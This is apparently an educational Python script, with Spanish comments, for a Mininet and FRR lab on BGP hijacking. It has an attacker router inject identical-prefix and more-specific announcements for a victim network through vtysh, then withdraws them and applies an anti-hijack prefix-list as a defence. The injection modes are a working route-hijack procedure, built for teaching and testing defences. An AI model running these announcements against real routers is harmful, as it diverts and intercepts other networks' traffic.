#!/usr/bin/env python3
"""
Script de BGP Hijacking para el escenario Mininet + FRR
Inyecta anuncios BGP maliciosos desde el router atacante r3 mediante vtysh.

Modos:
  status            - Muestra la tabla BGP en r3 y r4 (estado actual)
  prefix-hijack     - r3 anuncia 10.0.10.0/24 (mismo prefijo que la victima)
  subprefix-hijack  - r3 anuncia 10.0.10.0/25 (longest-prefix match siempre gana)
  withdraw          - Retira ambos anuncios maliciosos
  defend            - Aplica prefix-list en r4 para rechazar anuncios de r3
                      sobre el espacio 10.0.10.0/24
"""

import argparse
import os
import shlex
import sys
import subprocess
import time
from datetime import datetime


def find_vtysh():
    for p in ('/usr/bin/vtysh', '/usr/lib/frr/vtysh', 'vtysh'):
        if os.path.isabs(p):
            if os.path.exists(p) and os.access(p, os.X_OK):
                return p
        else:
            if subprocess.call('which %s > /dev/null 2>&1' % p, shell=True) == 0:
                return p
    return 'vtysh'


VTYSH_BIN = find_vtysh()

# --- Rutas a los sockets vtysh de cada router FRR ---
VTY_R3 = '/tmp/r3'
VTY_R4 = '/tmp/r4'

# --- Prefijos involucrados ---
PREFIJO_VICTIMA      = '10.0.10.0/24'
PREFIJO_SUBHIJACK    = '10.0.10.0/25'

# --- Datos del peering ---
AS_ATACANTE = 65003
R3_IXP_IP   = '100.64.0.3'   # vecino visto por r4


def ts():
    return datetime.now().strftime('%H:%M:%S')


def print_header(title):
    print('\n' + '='*72)
    print('  %s' % title)
    print('='*72)


def vtysh_run(socket_dir, commands, description=''):
    """
    Ejecuta comandos vtysh contra el socket del router indicado.
    Usa multiples flags -c para mantener el contexto de modo entre comandos
    (vtysh -f no preserva el nodo de configuracion entre lineas en FRR 7.2).
    """
    # Eliminar lineas en blanco y espacios iniciales (el parser vtysh los rechaza)
    clean = [c.strip() for c in commands if c.strip()]

    argv = [VTYSH_BIN, '--vty_socket', socket_dir]
    for c in clean:
        argv += ['-c', c]

    cmd_display = '%s --vty_socket %s %s' % (
        VTYSH_BIN, socket_dir,
        ' '.join('-c %s' % shlex.quote(c) for c in clean),
    )
    print('[%s] >> %s' % (ts(), description or cmd_display))

    result = subprocess.run(argv, capture_output=True, text=True)
    combined = (result.stdout + result.stderr).strip()
    if combined:
        # vtysh mezcla errores en stdout con el resultado; mostrar todo
        for line in combined.splitlines():
            if line.strip():
                prefix = '[ERROR]' if 'Unknown command' in line or 'error' in line.lower() else '       '
                print('%s %s' % (prefix, line))
    # vtysh devuelve 0 incluso con errores de comando; detectamos errores en la salida
    if 'Unknown command' in combined:
        return False
    return True


def vtysh_show(socket_dir, command):
    """Ejecuta un comando 'show' y devuelve la salida."""
    result = subprocess.run(
        [VTYSH_BIN, '--vty_socket', socket_dir, '-c', command],
        capture_output=True, text=True,
    )
    return result.stdout or result.stderr


# =========================================================================
# Modos
# =========================================================================

def mode_status():
    print_header('ESTADO BGP ACTUAL')

    print('\n--- r3 (atacante AS%d) ---' % AS_ATACANTE)
    print(vtysh_show(VTY_R3, 'show ip bgp'))

    print('\n--- r4 (cliente AS65004) - vista global ---')
    print(vtysh_show(VTY_R4, 'show ip bgp'))

    print('--- r4: detalle de %s ---' % PREFIJO_VICTIMA)
    print(vtysh_show(VTY_R4, 'show ip bgp %s' % PREFIJO_VICTIMA))


def mode_prefix_hijack():
    print_header('HIJACK DE PREFIJO IDENTICO  ->  %s' % PREFIJO_VICTIMA)
    print('AS%d anuncia el MISMO prefijo que la victima (AS65001).' % AS_ATACANTE)
    print('Resolucion: AS_PATH igual -> desempate por router-id menor.')
    print('r3 tiene router-id 0.0.0.0 -> deberia ganar.\n')

    ok = vtysh_run(VTY_R3, [
        'configure terminal',
        'router bgp %d' % AS_ATACANTE,
        ' address-family ipv4 unicast',
        '  network %s' % PREFIJO_VICTIMA,
        ' exit-address-family',
        'end',
        'clear ip bgp * soft out',
    ], description='Inyectando network %s en r3' % PREFIJO_VICTIMA)

    if not ok:
        sys.exit(1)

    print('\n[*] Esperando propagacion BGP (5s)...')
    time.sleep(5)

    print('\n--- r4: tabla para %s ---' % PREFIJO_VICTIMA)
    print(vtysh_show(VTY_R4, 'show ip bgp %s' % PREFIJO_VICTIMA))

    print('[INFO] Verifica desde h_cliente:')
    print('       mininet> h_cliente curl -s http://10.0.10.10')


def mode_subprefix_hijack():
    print_header('SUB-PREFIX HIJACK  ->  %s (more-specific)' % PREFIJO_SUBHIJACK)
    print('AS%d anuncia un prefijo mas especifico que la victima.' % AS_ATACANTE)
    print('El longest-prefix match en r4 redirige TODO el trafico de %s a r3.\n'
          % PREFIJO_SUBHIJACK)

    ok = vtysh_run(VTY_R3, [
        'configure terminal',
        'router bgp %d' % AS_ATACANTE,
        ' address-family ipv4 unicast',
        '  network %s' % PREFIJO_SUBHIJACK,
        ' exit-address-family',
        'end',
        'clear ip bgp * soft out',
    ], description='Inyectando network %s en r3' % PREFIJO_SUBHIJACK)

    if not ok:
        sys.exit(1)

    print('\n[*] Esperando propagacion BGP (5s)...')
    time.sleep(5)

    print('\n--- r4: detalle de %s ---' % PREFIJO_SUBHIJACK)
    print(vtysh_show(VTY_R4, 'show ip bgp %s' % PREFIJO_SUBHIJACK))

    print('--- r4: ruta del kernel para 10.0.10.10 ---')
    result = subprocess.run('ip route get 10.0.10.10', shell=True,
                            capture_output=True, text=True)
    print(result.stdout)

    print('[INFO] Verifica desde h_cliente:')
    print('       mininet> h_cliente curl -s http://10.0.10.10')


def mode_withdraw():
    print_header('RETIRAR ANUNCIOS MALICIOSOS')
    print('Eliminando network %s y network %s de r3...\n'
          % (PREFIJO_VICTIMA, PREFIJO_SUBHIJACK))

    ok = vtysh_run(VTY_R3, [
        'configure terminal',
        'router bgp %d' % AS_ATACANTE,
        ' address-family ipv4 unicast',
        '  no network %s' % PREFIJO_VICTIMA,
        '  no network %s' % PREFIJO_SUBHIJACK,
        ' exit-address-family',
        'end',
        'clear ip bgp * soft out',
    ], description='Retirando anuncios falsos en r3')

    if not ok:
        sys.exit(1)

    print('\n[*] Esperando convergencia (5s)...')
    time.sleep(5)

    print('\n--- r4: tabla BGP final para %s ---' % PREFIJO_VICTIMA)
    print(vtysh_show(VTY_R4, 'show ip bgp %s' % PREFIJO_VICTIMA))

    print('[INFO] El trafico debe volver al servidor legitimo.')


def mode_defend():
    print_header('DEFENSA: prefix-list en r4 contra anuncios de r3')
    print('r4 rechazara cualquier anuncio de r3 que cubra 10.0.10.0/24 o mas especifico.')
    print('Equivalente a un filtro RPKI manual o IRR-based prefix filtering.\n')

    ok = vtysh_run(VTY_R4, [
        'configure terminal',
        'no ip prefix-list ANTI-HIJACK',
        'ip prefix-list ANTI-HIJACK seq 5 deny %s le 32' % PREFIJO_VICTIMA,
        'ip prefix-list ANTI-HIJACK seq 10 permit any',
        'router bgp 65004',
        ' address-family ipv4 unicast',
        '  neighbor %s prefix-list ANTI-HIJACK in' % R3_IXP_IP,
        ' exit-address-family',
        'end',
        'clear ip bgp * soft in',
    ], description='Aplicando prefix-list ANTI-HIJACK en r4 (entrada desde r3)')

    if not ok:
        sys.exit(1)

    print('\n[*] Esperando re-evaluacion (5s)...')
    time.sleep(5)

    print('\n--- r4: tabla BGP para %s tras la defensa ---' % PREFIJO_VICTIMA)
    print(vtysh_show(VTY_R4, 'show ip bgp %s' % PREFIJO_VICTIMA))

    print('--- r4: prefix-list activo ---')
    print(vtysh_show(VTY_R4, 'show ip prefix-list ANTI-HIJACK'))

    print('[INFO] Verifica desde h_cliente:')
    print('       mininet> h_cliente curl -s http://10.0.10.10')
    print('       (debe servir contenido LEGITIMO)')


# =========================================================================
# Entry point
# =========================================================================

def main():
    parser = argparse.ArgumentParser(
        description='BGP hijacking driver para el escenario Mininet + FRR',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Ejemplos (ejecutar dentro de Mininet CLI):
  mininet> r3 python3 /tmp/bgp_hijack_attack.py --mode status
  mininet> r3 python3 /tmp/bgp_hijack_attack.py --mode prefix-hijack
  mininet> r3 python3 /tmp/bgp_hijack_attack.py --mode subprefix-hijack
  mininet> r3 python3 /tmp/bgp_hijack_attack.py --mode defend
  mininet> r3 python3 /tmp/bgp_hijack_attack.py --mode withdraw
        """
    )
    parser.add_argument('--mode', required=True,
                        choices=['status', 'prefix-hijack', 'subprefix-hijack',
                                 'withdraw', 'defend'],
                        help='Accion BGP a ejecutar')
    args = parser.parse_args()

    if os.geteuid() != 0:
        print('[ERROR] Este script requiere privilegios root (ejecutar dentro de Mininet).')
        sys.exit(1)

    # Verificar disponibilidad de vtysh
    if not (os.path.exists(VTYSH_BIN) and os.access(VTYSH_BIN, os.X_OK)) and \
            subprocess.call('which vtysh > /dev/null 2>&1', shell=True) != 0:
        print('[ERROR] vtysh no encontrado en %s. Ejecuta primero ./setup_bgp_scenario.sh'
              % VTYSH_BIN)
        sys.exit(1)
    print('[INFO] vtysh: %s' % VTYSH_BIN)

    print('\n[WARNING] Script educativo. BGP hijacking real es ILEGAL.\n')

    try:
        if args.mode == 'status':
            mode_status()
        elif args.mode == 'prefix-hijack':
            mode_prefix_hijack()
        elif args.mode == 'subprefix-hijack':
            mode_subprefix_hijack()
        elif args.mode == 'withdraw':
            mode_withdraw()
        elif args.mode == 'defend':
            mode_defend()
    except KeyboardInterrupt:
        print('\n[!] Interrumpido por el usuario.')
        sys.exit(0)
    except Exception as e:
        print('\n[ERROR] %s' % e)
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
